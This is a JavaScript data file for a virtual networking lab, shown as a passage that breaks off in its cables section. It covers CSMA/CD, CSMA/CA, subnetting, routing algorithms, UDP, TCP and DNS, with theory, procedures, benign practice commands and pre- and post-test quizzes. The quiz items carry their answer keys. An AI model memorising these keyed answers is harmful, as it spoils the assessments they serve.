window.VLAB_DATA = {};

window.VLAB_DATA.csma = {
    "title": "Carrier Sense Multiple Access with Collision Detection (CSMA/CD)",
    "aim": "To simulate the Carrier Sense Multiple Access with Collision Detection (CSMA/CD) networking technique in order to demonstrate the mechanisms of carrier sensing, data transmission, collision detection via voltage monitoring, and the propagation of jamming signals in a shared network medium.",
    "theory": {
        "intro": "Carrier Sense Multiple Access with Collision Detection (CSMA/CD) is a media access control method historically used in early Ethernet networks for local area networking. It uses carrier sensing to defer transmissions until no other station is transmitting. If a collision is detected during transmission, the station transmits a jam signal and waits a random time (using a backoff algorithm) before retrying.",
        "cards": [
            {
                "title": "1. The Collision Window & Slot Time",
                "content": "The collision window is the maximum time required to detect a collision, equivalent to the round-trip propagation delay. The slot time in 10 Mbps Ethernet is defined as 512 bit times (51.2 microseconds). Any collision must be detected within this slot time. To ensure collision detection, the minimum frame size is set to 64 bytes (512 bits): \\n\\n$$\\text{Minimum Frame Size} \\ge 2 \\times \\text{Propagation Delay} \\times \\text{Bandwidth}$$"
            },
            {
                "title": "2. Binary Exponential Backoff (BEB) Algorithm",
                "content": "After $n$ consecutive collisions (up to 10), a station waits a random number of slot times chosen dynamically from the interval $[0, 2^n - 1]$. The maximum backoff interval freezes at $2^{10}-1 = 1023$ for attempts between 10 and 15. If a station fails to transmit after 16 attempts, the frame is discarded, and an error is reported upward."
            },
            {
                "title": "3. Carrier Sensing & Jamming Signal",
                "content": "A device first performs physical carrier sensing (monitoring the channel voltage). If idle (voltage at baseline), it transmits. During transmission, it compares transmitted signals with incoming medium voltage. If a spike is detected, indicating overlapping signals, it stops immediately and broadcasts a 32-bit 'Jam Signal' to ensure all other stations recognize the collision."
            }
        ]
    },
    "pretest": [
        {
            "q": "How does CSMA/CD detect a collision?",
            "options": [
                "By waiting for an acknowledgment signal",
                "By continuously monitoring the transmission medium's voltage level",
                "By using a token-based system",
                "By sending a preemptive jam signal"
            ],
            "correct": 1
        },
        {
            "q": "Why is CSMA/CD not commonly used in modern Ethernet networks?",
            "options": [
                "Because wireless networks are more efficient",
                "Because modern Ethernet uses full-duplex point-to-point switch connections",
                "Because CSMA/CD is not effective at high speeds",
                "Because token-ring networks have replaced Ethernet"
            ],
            "correct": 1
        },
        {
            "q": "What does the 'Carrier Sense' in CSMA/CD refer to?",
            "options": [
                "A device transmits without checking",
                "A device listens to the network medium for carrier signals before transmitting",
                "A device sends a jam signal after every transmission",
                "A device only transmits when another is sending"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Carrier Sense: Listen to the shared coaxial/twisted-pair transmission medium.",
        "2. Idle State: If the medium is idle (no voltage/carrier), begin data transmission.",
        "3. Busy State: If busy, defer transmission and wait until the medium becomes idle.",
        "4. Collision Detection: Monitor network voltage for unexpected spikes (amplitude threshold exceedance) while transmitting.",
        "5. Collision Handling: If a collision is detected, immediately halt data, broadcast a 32-bit Jam Signal, increment the collision count $n$, compute the backoff time, and schedule retransmission."
    ],
    "posttest": [
        {
            "q": "What happens when a collision is detected in CSMA/CD?",
            "options": [
                "Stations stop and wait for a random backoff time",
                "The detecting station continues transmitting",
                "The station resends immediately",
                "All stations stop permanently"
            ],
            "correct": 0
        },
        {
            "q": "Which of the following best describes binary exponential backoff?",
            "options": [
                "A method to increase bandwidth",
                "A way to ensure no device transmits simultaneously",
                "An algorithm that increases wait time exponentially after each collision to reduce congestion",
                "A technique to detect hidden terminals"
            ],
            "correct": 2
        },
        {
            "q": "What determines the minimum packet size in Ethernet?",
            "options": [
                "Switch processing speed",
                "Propagation delay and collision detection requirements (Slot Time)",
                "Total number of devices",
                "Packets sent per second"
            ],
            "correct": 1
        }
    ],
    "simType": "collision",
    "practice_commands": [
        "ping 192.168.1.2",
        "show mac address-table",
        "debug ip icmp"
    ],
    "practice_questions": [
        "What is the effect of the slot time on collision detection?",
        "How does a switch handle a frame if the destination MAC is missing from its table?"
    ]
};

window.VLAB_DATA.csma_ca = {
    "title": "Carrier Sense Multiple Access with Collision Avoidance (CSMA/CA)",
    "aim": "To demonstrate the Carrier Sense Multiple Access with Collision Avoidance (CSMA/CA) networking technique by simulating its key mechanisms: carrier sensing, the random backoff algorithm for collision avoidance, and the RTS/CTS handshake to resolve the Hidden Node Problem.",
    "theory": {
        "intro": "CSMA/CA is used in wireless networks (e.g., IEEE 802.11 Wi-Fi) because wireless transmitters cannot reliably detect collisions. A wireless station's own signal overwhelms its receiver, preventing it from detecting simultaneous transmissions. CSMA/CA aims to avoid collisions entirely by using acknowledgments, virtual carrier sensing, and random contention windows.",
        "cards": [
            {
                "title": "1. The Inter-Frame Spacing (IFS)",
                "content": "Different inter-frame spaces create access priorities. SIFS (Short Inter-Frame Space) is the shortest, reserved for high-priority transmissions like ACKs and CTS. DIFS (Distributed Inter-Frame Space) is the standard spacing. Stations must sense the channel idle for a full DIFS period before initiating backoff: \\n\\n$$\\text{DIFS} = \\text{SIFS} + (2 \\times \\text{Slot Time})$$"
            },
            {
                "title": "2. Virtual Carrier Sensing & NAV",
                "content": "Virtual carrier sensing uses the Network Allocation Vector (NAV). Every frame contains a 'Duration' field indicating how long the medium is reserved. Listening stations update their internal NAV timer and defer transmission until NAV reaches zero, even if physical sensing indicates an idle medium."
            },
            {
                "title": "3. Hidden Node Problem & RTS/CTS",
                "content": "The hidden node problem occurs when two stations (A and C) can communicate with an Access Point (B) but not with each other. If both send to B, collisions occur. The RTS/CTS handshake solves this: A sends a 'Request to Send' to B. B broadcasts a 'Clear to Send', silencing C (since C hears the CTS and updates its NAV) and granting A exclusive access."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which technique does CSMA/CA use to avoid collisions?",
            "options": [
                "Carrier Sense, NAV, and Random Backoff",
                "Collision Detection via Voltage monitoring",
                "Synchronous Time Slots",
                "Token Passing"
            ],
            "correct": 0
        },
        {
            "q": "Why does CSMA/CA use an acknowledgment (ACK) mechanism?",
            "options": [
                "Confirm success and trigger retransmission if missing, as collisions cannot be directly detected",
                "Detect collisions like CSMA/CD",
                "Allow multiple users simultaneously",
                "Increase transmission speed"
            ],
            "correct": 0
        },
        {
            "q": "What is the primary reason CSMA/CA is used in wireless instead of CSMA/CD?",
            "options": [
                "Wireless transceivers cannot listen and transmit on the same channel simultaneously (Self-Interference)",
                "Wireless has higher speeds",
                "CSMA/CD is more expensive",
                "Wireless has no collisions"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Physical Sensing: Listen to the channel. If busy, defer transmission.",
        "2. DIFS Deferral: Wait until the channel is physically idle for a duration equal to DIFS.",
        "3. Contention & Backoff: Choose a random slot number within the Contention Window (CW). Decrement this slot timer while the channel is idle. If the channel becomes busy, freeze the timer.",
        "4. RTS/CTS Handshake: Send an RTS frame. If the AP responds with a CTS, the virtual carrier sensing (NAV) is set on neighboring nodes.",
        "5. Data & ACK: Transmit the data frame. If a SIFS period passes without receiving an ACK frame, assume transmission failure, double the CW, and return to step 3."
    ],
    "posttest": [
        {
            "q": "What is the purpose of the RTS/CTS mechanism?",
            "options": [
                "Minimize the effect of the hidden node problem by reserving the channel",
                "Increase speed",
                "Eliminate all collisions",
                "Detect errors"
            ],
            "correct": 0
        },
        {
            "q": "What happens when multiple devices sense an idle channel in CSMA/CA?",
            "options": [
                "All transmit immediately",
                "Each decrements a unique random backoff timer before transmitting",
                "First device gains control",
                "All enter collision state"
            ],
            "correct": 1
        },
        {
            "q": "How does the backoff mechanism help?",
            "options": [
                "Forces same wait time",
                "Introduces random delay before retransmission to minimize repeat collisions",
                "Retries immediately",
                "Prevents hidden nodes"
            ],
            "correct": 1
        }
    ],
    "simType": "csma_ca",
    "practice_commands": [
        "show interfaces dot11radio 0",
        "show controllers dot11radio 0",
        "debug dot11 state"
    ],
    "practice_questions": [
        "Why is a random backoff used even if the channel is idle?",
        "Describe the difference between DIFS and SIFS timing."
    ]
};

window.VLAB_DATA.subnet = {
    "title": "Subnetting & Network Design",
    "aim": "To master the process of dividing a large network into smaller subnetworks by converting decimal values to binary, determining Network ID sizes, and calculating subnet masks based on specific departmental requirements.",
    "theory": {
        "intro": "Subnetting is the architectural division of a single physical network into multiple logical sub-networks (subnets). This strategy reduces broadcast domain sizes, enhances security, and allows administrators to allocate IP addresses efficiently.",
        "cards": [
            {
                "title": "1. IP Subnetting Formulas",
                "content": "To divide a network, bits are borrowed from the host portion. If we borrow $b$ bits, we create $2^b$ subnets. The remaining $H$ host bits determine the number of usable hosts per subnet: \\n\\n$$\\text{Usable Hosts} = 2^H - 2$$ \\n\\nTwo addresses are reserved: the Network Address (host portion all 0s) and the Broadcast Address (host portion all 1s)."
            },
            {
                "title": "2. CIDR (Classless Inter-Domain Routing)",
                "content": "CIDR replaced traditional Class A, B, and C networks with variable-length subnets. It uses a prefix length (e.g., /26) instead of a default class mask. A /26 mask indicates that the first 26 bits are the network prefix, leaving 6 bits ($32 - 26 = 6$) for host addressing ($2^6 - 2 = 62$ usable hosts)."
            },
            {
                "title": "3. VLSM (Variable Length Subnet Masking)",
                "content": "VLSM allows subnets of different sizes to be allocated from a single network block. Instead of assigning a fixed mask to all subnets, masks are customized based on the requirement of each segment (e.g., allocating a /30 subnet for point-to-point links and /24 subnets for user LANs) to avoid wasting IP space."
            }
        ]
    },
    "pretest": [
        {
            "q": "What is the purpose of an IP address?",
            "options": [
                "Provide a physical hardware address",
                "Uniquely identify a device on an IP network",
                "Convert binary to text",
                "Encrypt traffic"
            ],
            "correct": 1
        },
        {
            "q": "What is dotted decimal notation used for?",
            "options": [
                "Make 32-bit binary IP addresses human-readable",
                "Convert decimal to binary",
                "Represent hex values",
                "Separate Network ID from Host ID"
            ],
            "correct": 0
        },
        {
            "q": "Which is the default subnet mask for Class C?",
            "options": [
                "255.0.0.0",
                "255.255.0.0",
                "255.255.255.0",
                "255.255.255.255"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Requirement Analysis: Count the number of hosts required for each departmental subnet.",
        "2. Bit Calculation: Find the smallest integer $H$ such that $2^H - 2 \\ge \\text{Required Hosts}$.",
        "3. Subnet Mask Formulation: Determine the prefix CIDR value: $32 - H$. Convert to dotted decimal format.",
        "4. Range Allocation: Calculate the Network ID, usable range, and Broadcast ID for each subnet, starting with the largest subnet block.",
        "5. Configuration: Apply the calculated gateway IP and subnet mask to the local router interfaces."
    ],
    "posttest": [
        {
            "q": "What is the binary representation of 5 using 3 bits?",
            "options": [
                "100",
                "101",
                "011",
                "110"
            ],
            "correct": 1
        },
        {
            "q": "To create a subnet for 10 hosts, how many bits are needed for host ID?",
            "options": [
                "2 bits",
                "3 bits",
                "4 bits",
                "5 bits"
            ],
            "correct": 2
        },
        {
            "q": "A network needs 4 subnets. How many bits are required for the Subnet ID?",
            "options": [
                "1",
                "2",
                "3",
                "4"
            ],
            "correct": 1
        }
    ],
    "simType": "subnet_calc",
    "practice_commands": [
        "ip address 192.168.1.1 255.255.255.128",
        "show ip interface brief",
        "ping 192.168.1.129"
    ],
    "practice_questions": [
        "Calculate the broadcast address for 172.16.10.0/26.",
        "How many usable hosts are in a /28 subnet?"
    ]
};

window.VLAB_DATA.routing_dv = {
    "title": "Distance Vector Routing Algorithm",
    "aim": "To understand and simulate the Distance-Vector (DV) routing algorithm, demonstrating its iterative, asynchronous, and distributed nature for computing the shortest paths in a network using the Bellman-Ford equation.",
    "theory": {
        "intro": "Distance-Vector routing is a dynamic protocol class where each router maintains a table of distances to all known destinations. Routers periodically advertise their complete routing tables to directly connected neighbors, converging on the shortest path through iterative updates.",
        "cards": [
            {
                "title": "1. The Bellman-Ford Equation",
                "content": "The Bellman-Ford mathematical relation is the core update algorithm in distance vector routing. Let $D_x(y)$ be the cost of the least-cost path from node $x$ to $y$. The cost update is calculated as: \\n\\n$$D_x(y) = \\min_{v} \\{ c(x,v) + D_v(y) \\}$$ \\n\\nwhere $c(x,v)$ is the link cost from $x$ to neighbor $v$, and $D_v(y)$ is neighbor $v$'s cost estimate to destination $y$."
            },
            {
                "title": "2. Count-to-Infinity & Loop Prevention",
                "content": "If a link fails, routers may learn incorrect routes from neighbors who have not processed the failure, causing metric values to increment indefinitely (Count-to-Infinity). To resolve this, protocols use Split Horizon (do not advertise routes back to the neighbor from whom they were learned) and Poison Reverse (advertise failed routes with an infinite metric, e.g., 16 hops in RIP)."
            },
            {
                "title": "3. Routing Information Protocol (RIP)",
                "content": "RIP is the standard implementation of a Distance Vector protocol. It uses hop count as its metric, where each router adds a cost of 1 to incoming advertisements. A hop count of 16 is defined as unreachable, limiting RIP to networks with a maximum diameter of 15 hops."
            }
        ]
    },
    "pretest": [
        {
            "q": "What is the primary function of the DV routing algorithm?",
            "options": [
                "Encrypt traffic",
                "Compute shortest paths in a distributed manner",
                "Assign IP addresses",
                "Manage physical connections"
            ],
            "correct": 1
        },
        {
            "q": "Which describes a key characteristic of the DV algorithm?",
            "options": [
                "Requires central server",
                "Synchronous and centralized",
                "Iterative and distributed",
                "Focuses on static routes"
            ],
            "correct": 2
        },
        {
            "q": "What information does a node send to neighbors?",
            "options": [
                "Entire routing table",
                "Neighbor costs only",
                "Its own distance vector",
                "List of all nodes"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Distance Vector Initialization: Initialize each node's routing table with a cost of 0 to itself, direct link costs to neighbors, and infinity ($\\infty$) to all other destinations.",
        "2. Table Exchange: Periodically broadcast the local distance vector to all directly connected neighbor routers.",
        "3. Execution of Bellman-Ford: Upon receiving updates from a neighbor, recalculate costs using the Bellman-Ford equation.",
        "4. Dynamic Table Updates: Update local next-hop and metric settings if a lower-cost path is discovered.",
        "5. Convergence Observation: Observe how routing tables stabilize when no further updates modify any distance metrics."
    ],
    "posttest": [
        {
            "q": "Which mathematical equation is used to update a node's distance vector?",
            "options": [
                "D(y) = max{c + D}",
                "D(y) = min{c + D}",
                "D(y) = sum{c * D}",
                "D(y) = D / c"
            ],
            "correct": 1
        },
        {
            "q": "What happens when a node updates its distance vector?",
            "options": [
                "Resets table",
                "Sends the updated vector to neighbors",
                "Waits for next schedule",
                "Ignores update"
            ],
            "correct": 1
        },
        {
            "q": "In the Bellman-Ford equation, what does c(x, v) represent?",
            "options": [
                "Cost from neighbor to dest",
                "Cost to directly connected neighbor",
                "Minimum cost from node to dest",
                "Cost of entire path"
            ],
            "correct": 1
        }
    ],
    "simType": "dv_sim",
    "practice_commands": [
        "router rip",
        "network 10.0.0.0",
        "show ip rip database"
    ],
    "practice_questions": [
        "Explain the 'Count to Infinity' problem.",
        "How does 'Split Horizon' prevent routing loops?"
    ]
};

window.VLAB_DATA.routing_ls = {
    "title": "Link State Routing Algorithm",
    "aim": "To understand and simulate the Link State Routing algorithm, demonstrating how global network topology information is used with Dijkstra's algorithm to compute least-cost paths.",
    "theory": {
        "intro": "Link-State routing uses a global network view to make routing decisions. Instead of sharing distance tables, each router floods the network with Link-State Packets (LSPs) containing its local link status. Every router constructs an identical map of the network and independently runs Dijkstra's algorithm to compute the shortest-path tree.",
        "cards": [
            {
                "title": "1. Dijkstra's SPF Algorithm",
                "content": "Let $u$ be the source node. Initialize the shortest-path set $S$. For all nodes $v$, set $D(v)$ to the direct link cost $c(u,v)$ or $\\infty$ if not adjacent. Then, iteratively select node $w$ not in $S$ with the minimum $D(w)$, add it to $S$, and update the distance vectors of all remaining nodes: \\n\\n$$D(v) = \\min(D(v), D(w) + c(w,v))$$"
            },
            {
                "title": "2. Link State Packets & Flooding",
                "content": "An LSP contains a router's ID, its list of active neighbors, corresponding link costs, and a sequence number. LSPs are flooded throughout the network. Routers use sequence numbers to identify newer updates, discarding duplicate or older LSPs to prevent routing loops."
            },
            {
                "title": "3. Open Shortest Path First (OSPF)",
                "content": "OSPF is the dominant Link-State protocol. It scales well by dividing the network into Areas, with Area 0 serving as the core backbone. Link costs are calculated using bandwidth: \\n\\n$$\\text{Cost} = \\frac{10^8}{\\text{Bandwidth in bps}}$$"
            }
        ]
    },
    "pretest": [
        {
            "q": "What is the key characteristic of Link-State Routing?",
            "options": [
                "Maintain only neighbor info",
                "A complete, global view of network topology at every node",
                "Share tables with one neighbor",
                "Hop count only"
            ],
            "correct": 1
        },
        {
            "q": "Which algorithm is used in Link-State Routing?",
            "options": [
                "Bellman-Ford",
                "Dijkstra's Shortest Path First",
                "Floyd-Warshall",
                "A*"
            ],
            "correct": 1
        },
        {
            "q": "What type of packet is used to share info?",
            "options": [
                "Link-State Packet (LSP)",
                "Distance Vector Packet",
                "Hello Packet",
                "ACK Packet"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Topology Discovery: Exchange Hello packets to discover neighbor routers and verify physical connectivity.",
        "2. LSP Generation: Create Link-State Advertisements containing local neighbor interfaces and link costs.",
        "3. Reliable Flooding: Flood LSPs across the network to synchronize the Link-State Database (LSDB) on all routers.",
        "4. Dijkstra's Execution: Run Dijkstra's algorithm on the synchronized LSDB to calculate the shortest path tree.",
        "5. Forwarding Table Generation: Construct the forwarding table mapping destination prefixes to next-hop interfaces."
    ],
    "posttest": [
        {
            "q": "What is the primary advantage of LS over DV?",
            "options": [
                "Less memory",
                "Faster convergence and freedom from Count-to-Infinity problems",
                "Lower processing power",
                "Better for small networks"
            ],
            "correct": 1
        },
        {
            "q": "How does a node update D(v) in LS algorithm?",
            "options": [
                "max(D, D-c)",
                "D/c",
                "min(D, D+c)",
                "sum(D, c)"
            ],
            "correct": 2
        },
        {
            "q": "What is the final output of the LS algorithm?",
            "options": [
                "Complete routing table with next-hops",
                "Shortest paths only",
                "List of all devices",
                "Distance vector"
            ],
            "correct": 0
        }
    ],
    "simType": "ls_sim",
    "practice_commands": [
        "show ip ospf database",
        "show ip ospf neighbor",
        "clear ip ospf process"
    ],
    "practice_questions": [
        "Compare the convergence speed of Dijkstra vs Bellman-Ford.",
        "What is the purpose of an LSA (Link State Advertisement)?"
    ]
};

window.VLAB_DATA.udp = {
    "title": "Chat Application using UDP",
    "aim": "To understand the working of User Datagram Protocol (UDP), focusing on its connectionless, lightweight nature and minimal service overhead for time-sensitive applications.",
    "theory": {
        "intro": "User Datagram Protocol (UDP) is a connectionless, minimal transport layer protocol defined in RFC 768. It provides a simple, direct interface to IP, omitting flow control, congestion management, and transmission retries to minimize communication latency.",
        "cards": [
            {
                "title": "1. Connectionless Transport",
                "content": "UDP requires no initial handshake before sending data. Datagrams are packaged and transmitted immediately, making them 'unreliable' (best-effort delivery). If a packet is dropped, damaged, or duplicated, the protocol does not notify the sender or attempt retransmission; handling packet loss is left to the application layer."
            },
            {
                "title": "2. UDP Header Overhead",
                "content": "The UDP header has a fixed size of 8 bytes: Source Port (2B), Destination Port (2B), Length (2B), and Checksum (2B). This minimal overhead is significantly smaller than TCP's 20-60 byte header, reducing serialization delays."
            },
            {
                "title": "3. UDP Applications",
                "content": "UDP is ideal for real-time applications where low latency is more critical than guaranteed delivery (such as DNS, DHCP, VoIP, video streaming, and online gaming)."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which of the following best describes UDP?",
            "options": [
                "Connection-oriented",
                "Reliable transport",
                "Connectionless, lightweight best-effort transport",
                "Built-in error correction"
            ],
            "correct": 2
        },
        {
            "q": "Why is UDP suitable for VoIP?",
            "options": [
                "Guarantees error-free delivery",
                "Minimizes latency by avoiding handshake and retransmission delays",
                "Prioritizes security",
                "Built-in congestion control"
            ],
            "correct": 1
        },
        {
            "q": "Which is a key advantage of UDP over TCP?",
            "options": [
                "Guaranteed delivery",
                "Lower latency (no retransmissions or handshakes)",
                "Stronger encryption",
                "Automatic congestion control"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Socket Initialization: Initialize a UDP socket and bind it to a local port.",
        "2. Packet Creation: Construct the payload, adding the destination IP address and port.",
        "3. Fire-and-Forget: Transmit the UDP datagram without performing a connection handshake.",
        "4. Receipt: Listen on the designated port for incoming datagrams.",
        "5. Error Handling: Observe that dropped packets are not retransmitted, demonstrating UDP's best-effort delivery model."
    ],
    "posttest": [
        {
            "q": "Which application is most likely to use UDP?",
            "options": [
                "SMTP Email",
                "FTP File Download",
                "Live Video Streaming",
                "Online Banking"
            ],
            "correct": 2
        },
        {
            "q": "What is the main reason UDP does not guarantee ordered delivery?",
            "options": [
                "Lacks sequence numbers and ACKs",
                "Discards late packets",
                "Connection-oriented",
                "Based on priority"
            ],
            "correct": 0
        },
        {
            "q": "Which of the following is NOT a typical UDP use case?",
            "options": [
                "Online gaming",
                "DNS queries",
                "Web browsing",
                "VoIP calls"
            ],
            "correct": 2
        }
    ],
    "simType": "udp",
    "practice_commands": [
        "nc -u 192.168.1.10 5000",
        "netstat -unap",
        "tcpdump -i eth0 udp"
    ],
    "practice_questions": [
        "Why is the UDP header smaller than the TCP header?",
        "Give an example where packet loss is acceptable in a UDP application."
    ]
};

window.VLAB_DATA.tcp = {
    "title": "File Transfer using TCP",
    "aim": "To demonstrate and understand the working of the Transmission Control Protocol (TCP), including its connection-oriented 3-way handshake, reliable data transfer using GBN, and congestion control mechanisms like Slow Start and AIMD.",
    "theory": {
        "intro": "Transmission Control Protocol (TCP) is a connection-oriented, reliable transport protocol. It manages byte streams, ensures ordered delivery, and regulates traffic flow to prevent network congestion.",
        "cards": [
            {
                "title": "1. Three-Way Handshake & Connection States",
                "content": "TCP establishes connections using a 3-Way Handshake: \\n\\n$$\\text{SYN (seq=x)} \\to \\text{SYN-ACK (seq=y, ack=x+1)} \\to \\text{ACK (seq=x+1, ack=y+1)}$$ \\n\\nThis exchanges initial sequence numbers (ISNs). Connection teardown uses a 4-way handshake exchanging FIN and ACK flags."
            },
            {
                "title": "2. Pipelining & Reliable Transfer (GBN)",
                "content": "TCP uses sliding window protocols to send multiple packets before receiving an acknowledgment. In Go-Back-N (GBN), the sender maintains a window of size $N$. If a packet times out, the sender retransmits that packet and all subsequent packets sent after it."
            },
            {
                "title": "3. Congestion Control (Slow Start & AIMD)",
                "content": "TCP regulates its transmission rate using the Congestion Window (CWND). In **Slow Start**, CWND doubles every RTT. After reaching the threshold (ssthresh), it enters **Congestion Avoidance**, increasing linearly by 1 MSS per RTT. If packet loss is detected (via a timeout), CWND drops to 1 MSS, and ssthresh is set to $\\text{CWND} / 2$ (Multiplicative Decrease)."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which TCP field ensures ordered data delivery?",
            "options": [
                "Sequence Number",
                "Acknowledgment Number",
                "Window Size",
                "Checksum"
            ],
            "correct": 0
        },
        {
            "q": "What happens during the slow-start phase?",
            "options": [
                "Congestion window increases exponentially",
                "Sender stops sending",
                "Window decreases exponentially",
                "Sender waits for signal"
            ],
            "correct": 0
        },
        {
            "q": "How does TCP ensure reliability?",
            "options": [
                "Checksums, sequence numbers, and acknowledgments",
                "Encryption",
                "Random packets",
                "Dropping duplicates"
            ],
            "correct": 0
        }
    ],
    "procedure": [
        "1. Handshake Phase: Send SYN, verify SYN-ACK receipt, and respond with ACK to establish the connection.",
        "2. Slow Start: Begin data transmission, doubling the window size (CWND) with each successful round-trip acknowledgment.",
        "3. Congestion Avoidance: Upon reaching the ssthresh value, transition to linear window growth (Additive Increase).",
        "4. Packet Loss Handling: Simulate a packet loss event. Observe the timeout, drop the CWND to 1, and halve the ssthresh.",
        "5. Teardown Phase: Initiate a 4-way handshake using FIN and ACK flags to close the socket connection."
    ],
    "posttest": [
        {
            "q": "What happens when a TCP sender detects packet loss?",
            "options": [
                "Reduces congestion window size",
                "Stops transmitting",
                "Increases rate",
                "Ignores loss"
            ],
            "correct": 0
        },
        {
            "q": "What is the purpose of the 3-way handshake?",
            "options": [
                "Verify IP",
                "Establish reliable connection and exchange initial sequence numbers",
                "Encrypt data",
                "Check congestion"
            ],
            "correct": 1
        },
        {
            "q": "Which mechanism prevents overwhelming the receiver?",
            "options": [
                "Slow Start",
                "Congestion Window",
                "Sliding Window Flow Control",
                "Checksum"
            ],
            "correct": 2
        }
    ],
    "simType": "gbn",
    "practice_commands": [
        "telnet 192.168.1.10 80",
        "show tcp brief",
        "netstat -tnap"
    ],
    "practice_questions": [
        "Describe the state transitions during a TCP 3-way handshake.",
        "What is the role of the Advertised Window in TCP flow control?"
    ]
};

window.VLAB_DATA.dns = {
    "title": "Domain Name System (DNS)",
    "aim": "To explore the working of the Domain Name System (DNS), demonstrating how this hierarchical, distributed database translates easy-to-remember hostnames into numerical IP addresses through recursive and iterative queries.",
    "theory": {
        "intro": "The Domain Name System (DNS) translates human-readable hostnames into numerical IP addresses. Since a single server cannot handle all queries globally, DNS uses a distributed, hierarchical database.",
        "cards": [
            {
                "title": "1. The DNS Hierarchy",
                "content": "DNS is structured hierarchically: \\n\\n- **Root DNS Servers**: The top tier, directing queries to TLD servers.\\n- **Top-Level Domain (TLD) Servers**: Manage domains like .com, .net, and country codes (e.g., .in).\\n- **Authoritative DNS Servers**: Maintained by organizations, providing final IP mappings for specific hostnames."
            },
            {
                "title": "2. Query Resolution: Recursive vs. Iterative",
                "content": "In a **Recursive Query**, the local DNS resolver handles the lookup process and returns the final IP address to the client. In an **Iterative Query**, the DNS server replies with the address of the next DNS server in the hierarchy, directing the client to perform the next query step."
            },
            {
                "title": "3. DNS Records & Time-to-Live (TTL)",
                "content": "DNS database entries are called Resource Records (RRs), formatted as `(Name, Value, Type, TTL)`. Type **A** maps hostnames to IPv4 addresses. Type **NS** specifies authoritative name servers. Type **CNAME** maps aliases to canonical names. **TTL** defines how long a record can be cached before it must be updated from the authoritative server."
            }
        ]
    },
    "pretest": [
        {
            "q": "What is the primary purpose of DNS?",
            "options": [
                "Translate human-readable hostnames to IP addresses",
                "Establish encrypted communication",
                "Store website content",
                "Control traffic flow"
            ],
            "correct": 0
        },
        {
            "q": "Which DNS query allows the server to take full responsibility?",
            "options": [
                "Iterative",
                "Recursive",
                "Authoritative",
                "Hierarchical"
            ],
            "correct": 1
        },
        {
            "q": "Which record type maps a hostname to an IP?",
            "options": [
                "CNAME",
                "NS",
                "A",
                "MX"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Query Initiation: Send a DNS query for a specific hostname from the client PC.",
        "2. Recursive Resolution: Trace the path from the local resolver to the Root, TLD, and Authoritative servers.",
        "3. Record Parsing: Inspect the returned Resource Record (A, CNAME, or NS) and its TTL value.",
        "4. Caching: Verify that subsequent queries for the same domain are answered instantly from the local cache.",
        "5. Iterative Mode Analysis: Compare recursive query paths with step-by-step iterative queries."
    ],
    "posttest": [
        {
            "q": "Which server handles extensions like '.com'?",
            "options": [
                "Root",
                "TLD",
                "Authoritative",
                "Recursive"
            ],
            "correct": 1
        },
        {
            "q": "What does the TTL field specify?",
            "options": [
                "Time after which cached record expires and must be refreshed",
                "Priority of query",
                "Security level",
                "Number of queries allowed"
            ],
            "correct": 0
        },
        {
            "q": "Which protocol is used by DNS?",
            "options": [
                "TCP",
                "UDP",
                "Both TCP (zone transfers/large payloads) and UDP (queries)",
                "ICMP"
            ],
            "correct": 2
        }
    ],
    "simType": "dns",
    "practice_commands": [
        "nslookup -type=mx google.com",
        "dig @8.8.8.8 www.mit.edu",
        "ipconfig /displaydns"
    ],
    "practice_questions": [
        "Explain the difference between an 'A' record and a 'CNAME' record.",
        "What is the function of the Root DNS servers?"
    ]
};

window.VLAB_DATA.cables_devices = {
    "title": "Cables, Connectors and Networking Devices",
    "aim": "To study types of cables (Twisted Pair, Co-axial, Fiber optic), connectors (RJ-45, BNC) and networking devices (Hub, Switch, Router, Gateway).",
    "theory": {
        "intro": "Physical layer media and network devices connect nodes to form a network. Selecting appropriate cabling and hardware is essential for bandwidth capacity, signal integrity, and cost-efficiency.",
        "cards": [
            {
                "title": "1. Guided Transmission Media",
                "content": "**Twisted Pair (UTP/STP)**: Consists of color-coded copper wires twisted in pairs to reduce electromagnetic interference (EMI). Standard Category 6 (Cat6) cabling supports 10Gbps up to 55m.\\n\\n**Coaxial Cable**: Features a copper conductor surrounded by insulation and shielding, commonly used for broadband internet access.\\n\\n**Fiber Optic**: Uses light pulses to transmit data through glass or plastic fibers, providing high bandwidth over long distances."
            },
            {
                "title": "2. Networking Connectors",
                "content": "**RJ-45**: The standard 8-pin connector used to terminate twisted-pair Ethernet cables. Uses the T568A or T568B pinout standards.\\n\\n**BNC**: A bayonet-style connector used to terminate coaxial cables, common in early thin Ethernet networks and analog video systems."
            },
            {
                "title": "3. Hubs, Switches, and Routers",
                "content": "**Hub (Physical Layer)**: A legacy multiport repeater that broadcasts all incoming traffic to all ports, creating a single collision domain.\\n\\n**Switch (Data Link Layer)**: Filters and forwards frames to specific MAC addresses using a MAC address table, dividing the network into separate collision domains.\\n\\n**Router (Network Layer)**: Connects different IP subnets and forwards packets using IP routing tables, defining broadcast domain boundaries."
            }
        ]
    },
    "pretest": [
        {
            "q": "Which cable is least susceptible to EMI?",
            "options": [
                "UTP",
                "STP",
                "Coaxial",
                "Fiber Optic"
            ],
            "correct": 3
        },
        {
            "q": "What is the maximum length of a UTP cable segment?",
            "options": [
                "100m",
                "500m",
                "1000m",
                "10m"
            ],
            "correct": 0
        },
        {
            "q": "Which device operates at the Network Layer (Layer 3)?",
            "options": [
                "Hub",
                "Switch",
                "Router",
                "Bridge"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. Media Analysis: Examine properties of UTP, coaxial, and single-mode/multi-mode fiber cables.",
        "2. Connector Pinouts: Study the pin assignments for T568A and T568B Ethernet configurations.",
        "3. Hardware Sandbox: Place a Hub, Switch, and Router into the topology workspace.",
        "4. Cabling: Connect host PCs to the Switch using straight-through cables.",
        "5. Loopback & Verification: Run link checks to verify status and establish connectivity."
    ],
    "posttest": [
        {
            "q": "What does RJ stand for in RJ-45?",
            "options": [
                "Registered Jack",
                "Radio Jack",
                "Routing Junction",
                "Real Joint"
            ],
            "correct": 0
        },
        {
